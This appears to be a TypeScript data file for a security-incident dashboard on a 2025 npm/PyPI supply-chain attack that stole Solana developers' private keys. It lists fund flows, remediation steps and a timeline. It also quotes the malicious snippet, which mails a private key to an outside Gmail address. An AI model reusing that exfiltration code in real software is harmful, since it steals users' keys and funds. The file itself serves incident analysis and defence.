import type { FundFlow, RemediationAction, TimelineEvent } from "@/types"

export const vulnerable_code = `
// Malicious code from solana-transaction-toolkit
const sendKey = (privateKey) => {
  transporter.sendMail({
    from: 'you@gmail.com',
    to: 'czhanood@gmail.com',
    text: privateKey // Plaintext exfiltration
  });
};
`

export const fixed_code = `
// Secure key management
import { KeyManagementServiceClient } from '@google-cloud/kms';
const client = new KeyManagementServiceClient();
// Use GCP KMS for encryption
`

export const flow_data: FundFlow[] = [
  {
    blockchain: "Solana",
    from: "Developer Wallets",
    to: "3RbBjhVRi8qYoGB5NLiKEszq2ci559so4nPqv2iNjs8Q",
    amount: "$164.1K (Various Assets)",
    status: "Stolen"
  },
  {
    blockchain: "Ethereum",
    from: "0x70479...d3F1",
    to: "Tornado Cash",
    amount: "87.5 ETH ($262K)",
    status: "Mixed"
  },
  {
    blockchain: "Binance Smart Chain",
    from: "Attacker Wallet",
    to: "MEXC/Bybit",
    amount: "$32.1K Frozen",
    status: "Recovered"
  }
]

export const remediation_data: RemediationAction[] = [
  {
    action: "Malicious Package Removal (14 packages)",
    status: "Complete",
    date: "2025-01-12"
  },
  {
    action: "GitHub Repository Takedowns",
    status: "Complete",
    date: "2025-01-15"
  },
  {
    action: "Socket.dev Integration",
    status: "Complete",
    date: "2025-01-20"
  },
  {
    action: "NPM 2FA Enforcement",
    status: "Ongoing",
    date: "2025-02-01"
  }
]

export const stat_card_data = {
  title: "Supply Chain Attack Impact",
  value: "$164.1K Stolen | 920+ Wallets",
  isCritical: true,
  showProgress: true,
  progressValue: 19.5 // $32.1K recovered
}

export const timeline: TimelineEvent[] = [
  {
    time: "2025-01-10 03:00 UTC",
    title: "Attack Initiation",
    description: "First malicious packages published to npm/PyPI"
  },
  {
    time: "2025-01-11 14:30 UTC",
    title: "Socket.dev Detection",
    description: "Anomalous SMTP traffic patterns identified"
  },
  {
    time: "2025-01-12 09:00 UTC",
    title: "Package Takedowns",
    description: "14 malicious packages removed"
  },
  {
    time: "2025-01-15",
    title: "GitHub Repos Removed",
    description: "moonshot-wif-hwan & Diveinprogramming accounts banned"
  },
  {
    time: "2025-01-20",
    title: "Prevention Tools Launched",
    description: "Real-time dependency scanning implemented"
  }
]

export const tvl_chart_data = {
  title: "Solana Dev Activity Impact",
  exploitDate: "2025-01-10",
  showPercentageChange: true,
  data: [
    { date: "2024-12-01", value: 85000 }, // Active developers
    { date: "2025-01-09", value: 82000 },
    { date: "2025-01-10", value: 45000 },
    { date: "2025-02-01", value: 68000 }
  ]
}

export const exploit_diagram_data = {
  title: "Supply Chain Attack Flow",
  topSteps: [
    "Typosquatted Packages", 
    "Private Key Exfiltration",
    "Automated Wallet Draining"
  ],
  bottomSteps: [
    "Developer Machines", 
    "Gmail SMTP Servers",
    "Attacker Wallets"
  ],
  bottomArrowLabels: [
    "14 Malicious Packages", 
    "$164.1K Drained"
  ]
}
